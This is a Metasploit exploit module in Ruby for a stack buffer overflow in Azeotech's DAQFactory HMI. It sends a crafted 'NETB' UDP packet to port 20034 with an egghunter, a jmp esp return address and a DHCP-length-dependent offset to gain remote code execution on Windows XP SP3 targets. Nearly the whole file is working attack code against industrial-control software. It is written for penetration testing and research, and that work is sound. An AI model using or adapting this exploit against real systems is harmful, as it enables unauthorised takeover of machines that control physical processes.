# $Id: daq_factory_bof.rb 13750 2011-09-18 02:45:55Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::Udp
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;DaqFactory HMI NETB Request Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in Azeotech&#039;s DaqFactory
                product. The specfic vulnerability is triggered when sending a specially crafted
                &#039;NETB&#039; request to port 20034. Exploitation of this vulnerability may take a few
                seconds due to the use of egghunter.  This vulnerability was one of the 14
                releases discovered by researcher Luigi Auriemma.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;,  # Initial discovery, crash poc
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;,  # msf exploit
                ],
 
            &#039;Version&#039;        => &#039;$Revision: 13750 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/daqfactory_1-adv.txt&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 600,
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;DAQFactory Pro 5.85 Build 1853 on Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039; => 0x100B9EDF,  # jmp esp PEGRP32A.dll
                            &#039;Offset&#039; => 636,
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;Sep 13 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                # Required for EIP offset
                OptString.new(&#039;DHCP&#039;, [ true, "The DHCP server IP of the target", "" ]),
                Opt::RPORT(20034)
            ], self.class)
    end
 
    def exploit
        connect_udp
 
        print_status("Trying target #{target.name}...")
 
        eggoptions ={
            :checksum => false,
            :eggtag => &#039;scar&#039;,
        }
 
        # Correct the offset according to the 2nd IP (DHCP) length
        iplen = datastore[&#039;DHCP&#039;].length
 
        if iplen == 15
            offset = 78
        elsif iplen == 14
            offset = 79
        elsif iplen == 13
            offset = 80
        elsif iplen == 12
            offset = 81
        elsif iplen == 11
            offset = 82
        elsif iplen == 10
            offset = 83
        elsif iplen == 9
            offset = 84
        elsif iplen == 8
            offset = 85
        elsif iplen == 7
            offset = 86
        elsif iplen == 6
            offset = 87
        # attack class A ip, slightly unlikly, but just in case.
        elsif iplen == 5
            offset = 88
        end
 
        if offset >= 80
            pktoffset = offset - 80
            finaloffset = target[&#039;Offset&#039;]-pktoffset
        elsif offset <= 79
            pktoffset = 80 - offset
            finaloffset = target[&#039;Offset&#039;]+pktoffset
        end
 
        # springboard onto our unmodified payload
        p = Rex::Arch::X86.jmp(750) + payload.encoded
        hunter,egg = generate_egghunter(p, payload_badchars, eggoptions)
 
        sploit  = "NETB"  # NETB request overflow
        sploit << rand_text_alpha_upper(233)
        sploit << "\x00"  # part of the packet structure
        sploit << rand_text_alpha_upper(offset)  # include the offset for the DHCP address
        sploit << make_nops(2)
        sploit << hunter
        sploit << rand_text_alpha_upper(52-hunter.length-2)
        sploit << [target.ret].pack("V")
        sploit << rand_text_alpha_upper(12)
        sploit << Rex::Arch::X86.jmp_short(-70)
        sploit << egg
        # packetlen needs to be adjusted to a max of 0x400 as per advisory
        sploit << rand_text_alpha_upper(finaloffset-egg.length)
 
        # The use of rand_text_alpha_upper() ensures we always get the same length for the
        # first IP address. See the following for more details:
        # http://dev.metasploit.com/redmine/issues/5453
        sploit[12,4] = rand_text_alpha_upper(4)
 
        udp_sock.put(sploit)
 
        handler
        disconnect_udp
    end
 
end



